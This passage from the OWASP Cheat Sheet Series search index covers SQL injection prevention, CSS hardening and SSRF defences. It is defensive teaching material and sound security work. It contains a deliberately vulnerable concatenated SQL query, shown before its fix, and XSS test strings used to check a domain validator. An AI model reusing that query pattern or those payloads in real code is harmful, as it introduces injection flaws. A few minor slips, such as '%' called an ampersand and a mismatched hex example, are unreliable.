Text )) Dim reader As SqlDataReader = command . ExecuteReader () '... Catch se As SqlException 'error handling End Try","title":"Defense Option 2: Stored Procedures"},{"location":"cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html#defense-option-3-whitelist-input-validation","text":"Various parts of SQL queries aren't legal locations for the use of bind variables, such as the names of tables or columns, and the sort order indicator (ASC or DESC). In such situations, input validation or query redesign is the most appropriate defense. For the names of tables or columns, ideally those values come from the code, and not from user parameters. But if user parameter values are used for targeting different table names and column names, then the parameter values should be mapped to the legal/expected table or column names to make sure unvalidated user input doesn't end up in the query. Please note, this is a symptom of poor design and a full rewrite should be considered if time allows. Here is an example of table name validation. String tableName; switch(PARAM): case \"Value1\": tableName = \"fooTable\"; break; case \"Value2\": tableName = \"barTable\"; break; ... default : throw new InputValidationException(\"unexpected value provided\" + \" for table name\"); The tableName can then be directly appended to the SQL query since it is now known to be one of the legal and expected values for a table name in this query. Keep in mind that generic table validation functions can lead to data loss as table names are used in queries where they are not expected. For something simple like a sort order, it would be best if the user supplied input is converted to a boolean, and then that boolean is used to select the safe value to append to the query. This is a very standard need in dynamic query creation. For example: public String someMethod ( boolean sortOrder ) { String SQLquery = \"some SQL ... order by Salary \" + ( sortOrder ? \"ASC\" : \"DESC\" ); ` ... Any time user input can be converted to a non-String, like a date, numeric, boolean, enumerated type, etc. before it is appended to a query, or used to select a value to append to the query, this ensures it is safe to do so. Input validation is also recommended as a secondary defense in ALL cases, even when using bind variables as is discussed later in this article. More techniques on how to implement strong whitelist input validation is described in the Input Validation Cheat Sheet .","title":"Defense Option 3: Whitelist Input Validation"},{"location":"cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html#defense-option-4-escaping-all-user-supplied-input","text":"This technique should only be used as a last resort, when none of the above are feasible. Input validation is probably a better choice as this methodology is frail compared to other defenses and we cannot guarantee it will prevent all SQL Injection in all situations. This technique is to escape user input before putting it in a query. It is very database specific in its implementation. It's usually only recommended to retrofit legacy code when implementing input validation isn't cost effective. Applications built from scratch, or applications requiring low risk tolerance should be built or re-written using parameterized queries, stored procedures, or some kind of Object Relational Mapper (ORM) that builds your queries for you. This technique works like this. Each DBMS supports one or more character escaping schemes specific to certain kinds of queries. If you then escape all user supplied input using the proper escaping scheme for the database you are using, the DBMS will not confuse that input with SQL code written by the developer, thus avoiding any possible SQL injection vulnerabilities. The OWASP Enterprise Security API (ESAPI) is a free, open source, web application security control library that makes it easier for programmers to write lower-risk applications. The ESAPI libraries are designed to make it easier for programmers to retrofit security into existing applications. The ESAPI libraries also serve as a solid foundation for new development: Full details on ESAPI are available here on OWASP . The javadoc for ESAPI 2.x (Legacy) is available . This code was migrated to GitHub in November 2014. The legacy ESAPI for Java at GitHub helps understand existing use of it when Javadoc seems insufficient. An attempt at another ESAPI for Java GitHub has other approaches and no tests or concrete codecs. To find the javadoc specifically for the database encoders, click on the Codec class on the left hand side. There are lots of Codecs implemented. The two Database specific codecs are OracleCodec , and MySQLCodec . Just click on their names in the All Known Implementing Classes: at the top of the Interface Codec page. At this time, ESAPI currently has database encoders for: Oracle MySQL (Both ANSI and native modes are supported) Database encoders are forthcoming for: SQL Server PostgreSQL If your database encoder is missing, please let us know.","title":"Defense Option 4: Escaping All User-Supplied Input"},{"location":"cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html#database-specific-escaping-details","text":"If you want to build your own escaping routines, here are the escaping details for each of the databases that we have developed ESAPI Encoders for: Oracle SQL Server DB2","title":"Database Specific Escaping Details"},{"location":"cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html#oracle-escaping","text":"This information is based on the Oracle Escape character information .","title":"Oracle Escaping"},{"location":"cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html#escaping-dynamic-queries","text":"To use an ESAPI database codec is pretty simple. An Oracle example looks something like: ESAPI . encoder (). encodeForSQL ( new OracleCodec (), queryparam ); So, if you had an existing Dynamic query being generated in your code that was going to Oracle that looked like this: String query = \"SELECT user_id FROM user_data WHERE user_name = '\" + req . getParameter ( \"userID\" ) + \"' and user_password = '\" + req . getParameter ( \"pwd\" ) + \"'\" ; try { Statement statement = connection . createStatement ( \u2026 ); ResultSet results = statement . executeQuery ( query ); } You would rewrite the first line to look like this: Codec ORACLE_CODEC = new OracleCodec (); String query = \"SELECT user_id FROM user_data WHERE user_name = '\" + ESAPI . encoder (). encodeForSQL ( ORACLE_CODEC , req . getParameter ( \"userID\" )) + \"' and user_password = '\" + ESAPI . encoder (). encodeForSQL ( ORACLE_CODEC , req . getParameter ( \"pwd\" )) + \"'\" ; And it would now be safe from SQL injection, regardless of the input supplied. For maximum code readability, you could also construct your own OracleEncoder : Encoder oe = new OracleEncoder (); String query = \"SELECT user_id FROM user_data WHERE user_name = '\" + oe . encode ( req . getParameter ( \"userID\" )) + \"' and user_password = '\" + oe . encode ( req . getParameter ( \"pwd\" )) + \"'\" ; With this type of solution, you would need only to wrap each user-supplied parameter being passed into an ESAPI.encoder().encodeForOracle( ) call or whatever you named the call and you would be done.","title":"Escaping Dynamic Queries"},{"location":"cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html#turn-off-character-replacement","text":"Use SET DEFINE OFF or SET SCAN OFF to ensure that automatic character replacement is turned off. If this character replacement is turned on, the & character will be treated like a SQLPlus variable prefix that could allow an attacker to retrieve private data. See here and here for more information","title":"Turn off character replacement"},{"location":"cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html#escaping-wildcard-characters-in-like-clauses","text":"The LIKE keyword allows for text scanning searches. In Oracle, the underscore _ character matches only one character, while the ampersand % is used to match zero or more occurrences of any characters. These characters must be escaped in LIKE clause criteria. For example: SELECT name FROM emp WHERE id LIKE '%/_%' ESCAPE '/' ; SELECT name FROM emp WHERE id LIKE '%\\%%' ESCAPE '\\' ;","title":"Escaping Wildcard characters in Like Clauses"},{"location":"cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html#oracle-10g-escaping","text":"An alternative for Oracle 10g and later is to place { and } around the string to escape the entire string. However, you have to be careful that there isn't a } character already in the string. You must search for these and if there is one, then you must replace it with }} . Otherwise that character will end the escaping early, and may introduce a vulnerability.","title":"Oracle 10g escaping"},{"location":"cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html#mysql-escaping","text":"MySQL supports two escaping modes: ANSI_QUOTES SQL mode, and a mode with this off, which we call MySQL mode. ANSI SQL mode: Simply encode all ' (single tick) characters with '' (two single ticks) MySQL mode, do the following: NUL (0x00) --> \\0 [This is a zero, not the letter O] BS (0x08) --> \\b TAB (0x09) --> \\t LF (0x0a) --> \\n CR (0x0d) --> \\r SUB (0x1a) --> \\Z \" (0x22) --> \\\" % (0x25) --> \\% ' (0x27) --> \\' \\ (0x5c) --> \\\\ _ (0x5f) --> \\_ all other non-alphanumeric characters with ASCII values less than 256 --> \\c where 'c' is the original non-alphanumeric character. This information is based on the MySQL Escape character information .","title":"MySQL Escaping"},{"location":"cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html#sql-server-escaping","text":"We have not implemented the SQL Server escaping routine yet, but the following has good pointers and links to articles describing how to prevent SQL injection attacks on SQL server, see here .","title":"SQL Server Escaping"},{"location":"cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html#db2-escaping","text":"This information is based on DB2 WebQuery special characters as well as some information from Oracle's JDBC DB2 driver . Information in regards to differences between several DB2 Universal drivers .","title":"DB2 Escaping"},{"location":"cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html#hex-encoding-all-input","text":"A somewhat special case of escaping is the process of hex-encode the entire string received from the user (this can be seen as escaping every character). The web application should hex-encode the user input before including it in the SQL statement. The SQL statement should take into account this fact, and accordingly compare the data. For example, if we have to look up a record matching a sessionID, and the user transmitted the string abc123 as the session ID, the select statement would be: SELECT ... FROM session WHERE hex_encode ( sessionID ) = '616263313233' hex_encode should be replaced by the particular facility for the database being used. The string 606162313233 is the hex encoded version of the string received from the user (it is the sequence of hex values of the ASCII/UTF-8 codes of the user data). If an attacker were to transmit a string containing a single-quote character followed by their attempt to inject SQL code, the constructed SQL statement will only look like: ... WHERE hex_encode ( ... ) = '2720 ... ' 27 being the ASCII code (in hex) of the single-quote, which is simply hex-encoded like any other character in the string. The resulting SQL can only contain numeric digits and letters a to f , and never any special character that could enable an SQL injection.","title":"Hex-encoding all input"},{"location":"cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html#escaping-sqli-in-php","text":"Use prepared statements and parameterized queries. These are SQL statements that are sent to and parsed by the database server separately from any parameters. This way it is impossible for an attacker to inject malicious SQL. You basically have two options to achieve this: Using PDO (for any supported database driver): $stmt = $pdo->prepare('SELECT * FROM employees WHERE name = :name'); $stmt->execute(array('name' => $name)); foreach ($stmt as $row) { // do something with $row } Using MySQLi (for MySQL): $stmt = $dbConnection->prepare('SELECT * FROM employees WHERE name = ?'); $stmt->bind_param('s', $name); $stmt->execute(); $result = $stmt->get_result(); while ($row = $result->fetch_assoc()) { // do something with $row } PDO is the universal option. If you're connecting to a database other than MySQL, you can refer to a driver-specific second option (e.g. pg_prepare() and pg_execute() for PostgreSQL).","title":"Escaping SQLi in PHP"},{"location":"cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html#additional-defenses","text":"Beyond adopting one of the four primary defenses, we also recommend adopting all of these additional defenses in order to provide defense in depth. These additional defenses are: Least Privilege Whitelist Input Validation","title":"Additional Defenses"},{"location":"cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html#least-privilege","text":"To minimize the potential damage of a successful SQL injection attack, you should minimize the privileges assigned to every database account in your environment. Do not assign DBA or admin type access rights to your application accounts. We understand that this is easy, and everything just 'works' when you do it this way, but it is very dangerous. Start from the ground up to determine what access rights your application accounts require, rather than trying to figure out what access rights you need to take away. Make sure that accounts that only need read access are only granted read access to the tables they need access to. If an account only needs access to portions of a table, consider creating a view that limits access to that portion of the data and assigning the account access to the view instead, rather than the underlying table. Rarely, if ever, grant create or delete access to database accounts. If you adopt a policy where you use stored procedures everywhere, and don't allow application accounts to directly execute their own queries, then restrict those accounts to only be able to execute the stored procedures they need. Don't grant them any rights directly to the tables in the database. SQL injection is not the only threat to your database data. Attackers can simply change the parameter values from one of the legal values they are presented with, to a value that is unauthorized for them, but the application itself might be authorized to access. As such, minimizing the privileges granted to your application will reduce the likelihood of such unauthorized access attempts, even when an attacker is not trying to use SQL injection as part of their exploit. While you are at it, you should minimize the privileges of the operating system account that the DBMS runs under. Don't run your DBMS as root or system! Most DBMSs run out of the box with a very powerful system account. For example, MySQL runs as system on Windows by default! Change the DBMS's OS account to something more appropriate, with restricted privileges.","title":"Least Privilege"},{"location":"cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html#multiple-db-users","text":"The designer of web applications should not only avoid using the same owner/admin account in the web applications to connect to the database. Different DB users could be used for different web applications. In general, each separate web application that requires access to the database could have a designated database user account that the web-app will use to connect to the DB. That way, the designer of the application can have good granularity in the access control, thus reducing the privileges as much as possible. Each DB user will then have select access to what it needs only, and write-access as needed. As an example, a login page requires read access to the username and password fields of a table, but no write access of any form (no insert, update, or delete). However, the sign-up page certainly requires insert privilege to that table; this restriction can only be enforced if these web apps use different DB users to connect to the database.","title":"Multiple DB Users"},{"location":"cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html#views","text":"You can use SQL views to further increase the granularity of access by limiting the read access to specific fields of a table or joins of tables. It could potentially have additional benefits: for example, suppose that the system is required (perhaps due to some specific legal requirements) to store the passwords of the users, instead of salted-hashed passwords. The designer could use views to compensate for this limitation; revoke all access to the table (from all DB users except the owner/admin) and create a view that outputs the hash of the password field and not the field itself. Any SQL injection attack that succeeds in stealing DB information will be restricted to stealing the hash of the passwords (could even be a keyed hash), since no DB user for any of the web applications has access to the table itself.","title":"Views"},{"location":"cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html#whitelist-input-validation","text":"In addition to being a primary defense when nothing else is possible (e.g., when a bind variable isn't legal), input validation can also be a secondary defense used to detect unauthorized input before it is passed to the SQL query. For more information please see the Input Validation Cheat Sheet . Proceed with caution here. Validated data is not necessarily safe to insert into SQL queries via string building.","title":"Whitelist Input Validation"},{"location":"cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html#related-articles","text":"SQL Injection Attack Cheat Sheets : The following articles describe how to exploit different kinds of SQL Injection Vulnerabilities on various platforms that this article was created to help you avoid: SQL Injection Cheat Sheet Bypassing WAF's with SQLi - SQL Injection Bypassing WAF Description of SQL Injection Vulnerabilities : OWASP article on SQL Injection Vulnerabilities OWASP article on Blind_SQL_Injection Vulnerabilities How to Avoid SQL Injection Vulnerabilities : OWASP Developers Guide article on how to avoid SQL injection vulnerabilities OWASP Cheat Sheet that provides numerous language specific examples of parameterized queries using both Prepared Statements and Stored Procedures The Bobby Tables site (inspired by the XKCD webcomic) has numerous examples in different languages of parameterized Prepared Statements and Stored Procedures How to Review Code for SQL Injection Vulnerabilities : OWASP Code Review Guide article on how to Review Code for SQL Injection Vulnerabilities How to Test for SQL Injection Vulnerabilities : OWASP Testing Guide article on how to Test for SQL Injection Vulnerabilities","title":"Related Articles"},{"location":"cheatsheets/Securing_Cascading_Style_Sheets_Cheat_Sheet.html","text":"Securing Cascading Style Sheets Cheat Sheet \u00b6 Introduction \u00b6 The goal of this CSS (Not XSS , but Cascading Style Sheet ) Cheat Sheet is to inform Programmers, Testers, Security Analysts, Front-End Developers and anyone who is interested in Web Application Security to use these recommendations or requirements in order to achieve better security when authoring Cascading Style Sheets . Let's demonstrate this risk with an example: Santhosh is a programmer who works for a company called X and authors a Cascading Style Sheet to implement styling of the web application. The application for which he is writing CSS Code has various roles like Student , Teacher , Super User & Administrator and these roles have different permissions (PBAC - Permission Based Access Control ) and Roles (RBAC - Role Based Access Control ). Not only do these roles have different access controls, but these roles could also have different styling for webpages that might be specific to an individual or group of roles. Santhosh thinks that it would a great optimized idea to create a \"global styling\" CSS file which has all the CSS styling/selectors for all of the roles. According to their role, a specific feature or user interface element will be rendered. For instance, Administrator will have different features compared to Student or Teacher or SuperUser . However, some permissions or features maybe common to some roles. Example: Profile Settings will be applicable to all the users here while Adding Users or Deleting Users is only applicable for Administrator . Example: .login .profileStudent .changePassword .addUsers .deleteUsers .addNewAdmin .deleteAdmin .exportUserData .exportProfileData ... Now, let's examine what are the risks associated with this style of coding. Risk #1 \u00b6 Motivated Attackers always take a look at *.CSS files to learn the features of the application even without being logged in. For instance: Jim is a motivated attacker and always tries to look into CSS files from the View-Source even before other attacks. When Jim looks into the CSS file, he sees that there are different features and different roles based on the CSS selectors like .profileSettings, .editUser, .addUser, .deleteUser and so on. Jim can use the CSS for intel gathering to help gain access to sensitive roles.This isa form of attacker due diligence even before trying to perform dangerous attacks to gain access to the web application. In a nutshell, having global styling could reveal sensitive information that could be beneficial to the attacker. Risk #2 \u00b6 Let's say, Santhosh has this habit of writing the descriptive selector names like .profileSettings, exportUserData, .changePassword, .oldPassword, .newPassword, .confirmNewPassword etc. Good programmers like to keep code readable and usable by other Code Reviewers of the team. The risk is that attackers could map these selectors to actual features of a web application. Defensive Mechanisms to Mitigate Attacker's Motivation \u00b6 Defense Mechanism \u00b6 As a CSS Coder / Programmer, always keep the CSS isolated by access control level. By this, it means Student will have a different CSS file called as StudentStyling.CSS while Administrator has AdministratorStyling.CSS and so on. Make sure these *.CSS files are accessed only for a user with the proper access control level. Only users with the proper access control level should be able to access their *.CSS file. If an authenticated user with the Student Role tries to access AdministratorStyling.CSS through forced browsing, an alert that an intrusion is occurring should be recorded. Defense Mechanism #2 \u00b6 Being a programmer or a tester, take care of the naming conventions of your CSS (Cascading Style Sheet) Selectors. Obfuscate the selector names in such a fashion that attackers are not informed what a specific selector is linking to. Example: CSS Selectors for addUser, addAdmin, profileSettings, changePassword could be named aHj879JK, bHjsU, ahkrrE, lOiksn respectively. These names could be randomly generated per user as well. This NPM package can be used to perform the renaming of the CSS selector. Defense Mechanism #3 \u00b6 Web applications that allow users to author content via HTML input could be vulnerable to malicious use of CSS. Uploaded HTML could use styles that are allowed by the web application but could be used for purposes other than intended which could lead to security risks. Example: You can read about how LinkedIn had a vulnerability which allowed malicious use of CSS that lead to the authoring of a page where the entire page was clickable including overwriting LinkedIn's standard navigation elements.","title":"Securing Cascading Style Sheets"},{"location":"cheatsheets/Securing_Cascading_Style_Sheets_Cheat_Sheet.html#securing-cascading-style-sheets-cheat-sheet","text":"","title":"Securing Cascading Style Sheets Cheat Sheet"},{"location":"cheatsheets/Securing_Cascading_Style_Sheets_Cheat_Sheet.html#introduction","text":"The goal of this CSS (Not XSS , but Cascading Style Sheet ) Cheat Sheet is to inform Programmers, Testers, Security Analysts, Front-End Developers and anyone who is interested in Web Application Security to use these recommendations or requirements in order to achieve better security when authoring Cascading Style Sheets . Let's demonstrate this risk with an example: Santhosh is a programmer who works for a company called X and authors a Cascading Style Sheet to implement styling of the web application. The application for which he is writing CSS Code has various roles like Student , Teacher , Super User & Administrator and these roles have different permissions (PBAC - Permission Based Access Control ) and Roles (RBAC - Role Based Access Control ). Not only do these roles have different access controls, but these roles could also have different styling for webpages that might be specific to an individual or group of roles. Santhosh thinks that it would a great optimized idea to create a \"global styling\" CSS file which has all the CSS styling/selectors for all of the roles. According to their role, a specific feature or user interface element will be rendered. For instance, Administrator will have different features compared to Student or Teacher or SuperUser . However, some permissions or features maybe common to some roles. Example: Profile Settings will be applicable to all the users here while Adding Users or Deleting Users is only applicable for Administrator . Example: .login .profileStudent .changePassword .addUsers .deleteUsers .addNewAdmin .deleteAdmin .exportUserData .exportProfileData ... Now, let's examine what are the risks associated with this style of coding.","title":"Introduction"},{"location":"cheatsheets/Securing_Cascading_Style_Sheets_Cheat_Sheet.html#risk-1","text":"Motivated Attackers always take a look at *.CSS files to learn the features of the application even without being logged in. For instance: Jim is a motivated attacker and always tries to look into CSS files from the View-Source even before other attacks. When Jim looks into the CSS file, he sees that there are different features and different roles based on the CSS selectors like .profileSettings, .editUser, .addUser, .deleteUser and so on. Jim can use the CSS for intel gathering to help gain access to sensitive roles.This isa form of attacker due diligence even before trying to perform dangerous attacks to gain access to the web application. In a nutshell, having global styling could reveal sensitive information that could be beneficial to the attacker.","title":"Risk #1"},{"location":"cheatsheets/Securing_Cascading_Style_Sheets_Cheat_Sheet.html#risk-2","text":"Let's say, Santhosh has this habit of writing the descriptive selector names like .profileSettings, exportUserData, .changePassword, .oldPassword, .newPassword, .confirmNewPassword etc. Good programmers like to keep code readable and usable by other Code Reviewers of the team. The risk is that attackers could map these selectors to actual features of a web application.","title":"Risk #2"},{"location":"cheatsheets/Securing_Cascading_Style_Sheets_Cheat_Sheet.html#defensive-mechanisms-to-mitigate-attackers-motivation","text":"","title":"Defensive Mechanisms to Mitigate Attacker's Motivation"},{"location":"cheatsheets/Securing_Cascading_Style_Sheets_Cheat_Sheet.html#defense-mechanism","text":"As a CSS Coder / Programmer, always keep the CSS isolated by access control level. By this, it means Student will have a different CSS file called as StudentStyling.CSS while Administrator has AdministratorStyling.CSS and so on. Make sure these *.CSS files are accessed only for a user with the proper access control level. Only users with the proper access control level should be able to access their *.CSS file. If an authenticated user with the Student Role tries to access AdministratorStyling.CSS through forced browsing, an alert that an intrusion is occurring should be recorded.","title":"Defense Mechanism"},{"location":"cheatsheets/Securing_Cascading_Style_Sheets_Cheat_Sheet.html#defense-mechanism-2","text":"Being a programmer or a tester, take care of the naming conventions of your CSS (Cascading Style Sheet) Selectors. Obfuscate the selector names in such a fashion that attackers are not informed what a specific selector is linking to. Example: CSS Selectors for addUser, addAdmin, profileSettings, changePassword could be named aHj879JK, bHjsU, ahkrrE, lOiksn respectively. These names could be randomly generated per user as well. This NPM package can be used to perform the renaming of the CSS selector.","title":"Defense Mechanism #2"},{"location":"cheatsheets/Securing_Cascading_Style_Sheets_Cheat_Sheet.html#defense-mechanism-3","text":"Web applications that allow users to author content via HTML input could be vulnerable to malicious use of CSS. Uploaded HTML could use styles that are allowed by the web application but could be used for purposes other than intended which could lead to security risks. Example: You can read about how LinkedIn had a vulnerability which allowed malicious use of CSS that lead to the authoring of a page where the entire page was clickable including overwriting LinkedIn's standard navigation elements.","title":"Defense Mechanism #3"},{"location":"cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html","text":"Server-Side Request Forgery Prevention Cheat Sheet \u00b6 Introduction \u00b6 The objective of the cheat sheet is to provide advices regarding the protection against Server Side Request Forgery (SSRF) attack. This cheat sheet will focus on the defensive point of view and will not explain how to perform this attack. This talk from the security researcher Orange Tsai as well as this document provide techniques on how to perform this kind of attack. Context \u00b6 SSRF is an attack vector that abuses an application to interact with the internal/external network or the machine itself. One of the enablers for this vector is the mishandling of URLs, as showcased in the following examples: Image on external server ( e.g. user enters image URL of their avatar for the application to download and use). Custom WebHook (user have to specify WebHook handlers or Callback URLs). Internal requests to interact with another service to serve a certain functionality. Most of the times, user data is sent along to be processed, and if badly handled, can perform certain injection attacks. Overview of a SSRF common flow \u00b6 Notes: SSRF is not limited to the HTTP protocol, despite the fact that in general the first request leverages it, yet the second request is performed by the application itself, and thus it could be using different protocols ( e.g. FTP, SMB, SMTP, etc.) and schemes ( e.g. file:// , phar:// , gopher:// , data:// , dict:// , etc.). The protocol/scheme usage is highly dependent on the application's requirements. If the application is vulnerable to XML eXternal Entity (XXE) injection then it can be exploited to perform a SSRF attack , take a look at the XXE cheat sheet to learn how to prevent the exposure to XXE. Cases \u00b6 Depending on the application's functionality and requirements, there are two basic cases in which SSRF can happen: Application can send request only to identified and trusted applications : Case when whitelist approach is available. Application can send requests to ANY external IP address or domain name : Case when whitelist approach is not available. Because these two cases are very different, this cheat sheet will describe defences against them separately. Case 1 - Application can send request only to identified and trusted applications \u00b6 Sometimes, an application need to perform request to another application, often located on another network, to perform a specific task. Depending of the business case, it can happen that information from the user are needed to perform the action. Example \u00b6 Take the example of a web application that receives and uses personal information from a user, such as their firstname/lastname/birthdate to create a profile in an internal HR system. By design, that web application will have to communicate using a protocol that the HR system understands in order to process that data. Basically, the user cannot reach the HR system directly, but, if the web application in charge of receiving the user information is vulnerable to SSRF then the user can leverage it to access the HR system. The user leverages the web application as a proxy to the HR system. The whitelist approach is a viable option in this case since the internal application called by the VulnerableApplication is clearly identified in the technical/business flow. It can be stated that the required calls will only be targeted between those identified and trusted applications. Available protections \u00b6 Several protective measures are possible at the Application and Network layers. In order to apply the defense in depth principle, both layers will be hardened against such attacks. Application layer \u00b6 The first level of protection that comes to mind is Input validation . Based on that point, the following question comes to mind: How to perform this input validation? As Orange Tsai shows in his talk , depending on the programming language used, parsers can be abused. One possible countermeasure is to apply the whitelisting approach when input validation is used because, most of the time, the format of the information expected from the user is globally know. The request sent to the internal application will be based on the following information: String containing business data. IP address (V4 or V6). Domain name. URL. Note: Disable the support for the following of the redirection in your web client in order to prevent the bypass of the input validation described in the section Exploitation tricks > Bypassing restrictions > Input validation > Unsafe redirect of this document . String \u00b6 In the context of SSRF, checks can be put in place to ensure that the string respects the business/technical format expected. A regex can be used to ensure that data received is valid from a security point of view if the input data have a simple format ( e.g. token, zip code, etc.). Otherwise, validation should be conducted using the libraries available from the string object because regex for complex formats are difficult to maintain and are highly error-prone. User input is assumed to be non-network related and consists of the user's personal information. Example: //Regex validation for a data having a simple format if ( Pattern . matches ( \"[a-zA-Z0-9\\\\s\\\\-]{1,50}\" , userInput )){ //Continue the processing because the input data is valid } else { //Stop the processing and reject the request } IP address \u00b6 In the context of SSRF, there are 2 possible validations to perform: Ensure that the data provided is a valid IP V4 or V6 address. Ensure that the IP address provided belongs to one of the IP addresses of the identified and trusted applications. The first layer of validation can be applied using libraries that ensure the security of the IP address format, based on the technology used (library option is proposed here in order to delegate the managing of the IP address format and leverage battle tested validation function): Verification of the proposed libraries has been performed regarding the exposure to bypasses (Hex, Octal, Dword, URL and Mixed encoding) described in this article . JAVA: Method InetAddressValidator.isValid from the Apache Commons Validator library. It is NOT exposed to bypass using Hex, Octal, Dword, URL and Mixed encoding. .NET : Method IPAddress.TryParse from the SDK. It is exposed to bypass using Hex, Octal, Dword and Mixed encoding but NOT the URL encoding. As whitelisting is used here, any bypass tentative will be blocked during the comparison against the allowed list of IP addresses. JavaScript : Library ip-address . It is NOT exposed to bypass using Hex, Octal, Dword, URL and Mixed encoding. Python : Module ipaddress from the SDK. It is NOT exposed to bypass using Hex, Octal, Dword, URL and Mixed encoding. Ruby : Class IPAddr from the SDK. It is NOT exposed to bypass using Hex, Octal, Dword, URL and Mixed encoding. Use the output value of the method/library as the IP address to compare against the whitelist. After ensuring the validity of the incoming IP address, the second layer of validation is applied. A whitelist is created after determining all the IP addresses (v4 and v6 in order to avoid bypasses) of the identified and trusted applications. The valid IP is cross checked with that list to ensure its communication with the internal application (string strict comparison with case sensitive). Domain name \u00b6 In the attempt of validating domain names, it is apparent to do a DNS resolution in order to verify the existence of the domain. In general, it is not a bad idea, yet it opens up the application to attacks depending on the configuration used regarding the DNS servers used for the domain name resolution: It can disclose information to external DNS resolvers. It can be used by an attacker to bind a legit domain name to an internal IP address. See the section Exploitation tricks > Bypassing restrictions > Input validation > DNS pinning of this document . It can be used, by an attacker, to deliver a malicious payload to the internal DNS resolvers as well as to the API (SDK or third-party) used by the application to handle the DNS communication and then, potentially, trigger a vulnerability in one of these components. In the context of SSRF, there are 2 validations to perform: Ensure that the data provided is a valid domain name. Ensure that the domain name provided belongs to one of the domain names of the identified and trusted applications (the whitelisting comes to action here). Similar to the IP address validation, the first layer of validation can be applied using libraries that ensure the security of the domain name format, based on the technology used (library option is proposed here in order to delegate the managing of the domain name format and leverage battle tested validation function): Verification of the proposed libraries has been performed to ensure that the proposed functions do not perform any DNS resolution query. JAVA: Method DomainValidator.isValid from the Apache Commons Validator library. .NET : Method Uri.CheckHostName from the SDK. JavaScript : Library is-valid-domain . Python : Module validators.domain . Ruby : No valid dedicated gem has been found. domainator , public_suffix and addressable has been tested but unfortunately they all consider <script>alert(1)</script>.owasp.org as a valid domain name. This regex, taken from here , can be used: ^(((?!-))(xn--|_{1,1})?[a-z0-9-]{0,61}[a-z0-9]{1,1}\\.)*(xn--)?([a-z0-9][a-z0-9\\-]{0,60}|[a-z0-9-]{1,30}\\.[a-z]{2,})$ Example of execution of the proposed regex for Ruby: domain_names = [ \"owasp.org\" , \"owasp-test.org\" , \"doc-test.owasp.org\" , \"doc.owasp.org\" , \"<script>alert(1)</script>\" , \"<script>alert(1)</script>.owasp.org\" ] domain_names . each { | domain_name | if ( domain_name =~ /^(((?!-))(xn--|_{1,1})?[a-z0-9-]{0,61}[a-z0-9]{1,1}\\.)*(xn--)?([a-z0-9][a-z0-9\\-]{0,60}|[a-z0-9-]{1,30}\\.[a-z]{2,})$/ ) puts \"[i] #{ domain_name } is VALID\" else puts \"[!] #{ domain_name } is INVALID\" end } $ ruby test.rb [ i ] owasp.org is VALID [ i ] owasp-test.org is VALID [ i ] doc-test.owasp.org is VALID [ i ] doc.owasp.org is VALID [ ! ] <script>alert ( 1 ) </script> is INVALID [ ! ] <script>alert ( 1 ) </script>.owasp.org is INVALID After ensuring the validity of the incoming domain name, the second layer of validation is applied: Build a whitelist with all the domain names of every identified and trusted applications. Verify that the domain name received is part of this whitelist (string strict comparison with case sensitive). Unfortunately here, the application is still vulnerable to the DNS pinning bypass mentioned in this document . Indeed, a DNS resolution will be made when the business code will be executed. To address that issue, the following action must be taken in addition of the validation on the domain name: Ensure that the domains that are part of your organization are resolved by your internal DNS server first in the chains of DNS resolvers. Monitor the domains whitelist in order to detect when any of them resolves to a/an: Local IP address (V4 + V6). Internal IP of your organization (expected to be in private IP ranges) for the domain that are not part of your organization. The following Python3 script can be used, as a starting point, for the monitoring mentioned above: # Dependencies: pip install ipaddress dnspython import ipaddress import dns.resolver # Configure the whitelist to check DOMAINS_WHITELIST = [ \"owasp.org\" , \"labslinux\" ] # Configure the DNS resolver to use for all DNS queries DNS_RESOLVER = dns . resolver . Resolver () DNS_RESOLVER . nameservers = [ \"1.1.1.1\" ] def verify_dns_records ( domain , records , type ): \"\"\" Verify if one of the DNS records resolve to a non public IP address. Return a boolean indicating if any error has been detected. \"\"\" error_detected = False if records is not None : for record in records : value = record . to_text () . strip () try : ip = ipaddress . ip_address ( value ) # See https://docs.python.org/3/library/ipaddress.html#ipaddress.IPv4Address.is_global if not ip . is_global : print ( \"[!] DNS record type ' %s ' for domain name ' %s ' resolve to a non public IP address ' %s ' ! \" % (type, domain, value)) error_detected = True except ValueError : error_detected = True print ( \"[!] ' %s ' is not valid IP address!\" % value ) return error_detected def check (): \"\"\" Perform the check of the whitelist of domains. Return a boolean indicating if any error has been detected. \"\"\" error_detected = False for domain in DOMAINS_WHITELIST : # Get the IPs of the current domain # See https://en.wikipedia.org/wiki/List_of_DNS_record_types try : # A = IPv4 address record ip_v4_records = DNS_RESOLVER . query ( domain , \"A\" ) except Exception as e : ip_v4_records = None print ( \"[i] Cannot get A record for domain ' %s ': %s \\n \" % ( domain , e )) try : # AAAA = IPv6 address record ip_v6_records = DNS_RESOLVER . query ( domain , \"AAAA\" ) except Exception as e : ip_v6_records = None print ( \"[i] Cannot get AAAA record for domain ' %s ': %s \\n \" % ( domain , e )) # Verify the IPs obtained if verify_dns_records ( domain , ip_v4_records , \"A\" ) or verify_dns_records ( domain , ip_v6_records , \"AAAA\" ): error_detected = True return error_detected if __name__ == \"__main__\" : if check (): exit ( 1 ) else : exit ( 0 ) URL \u00b6 Do not accept complete URLs from the user because URL are difficult to validate and the parser can be abused depending on the technology used as showcased by the following talk of Orange Tsai . If network related information is really needed then only accept a valid IP address or domain name. Network layer \u00b6 The objective of the Network layer security is to prevent the VulnerableApplication from performing calls to arbitrary applications. Only allowed routes will be available for this application in order to limit its network access to only those that it should communicate with. 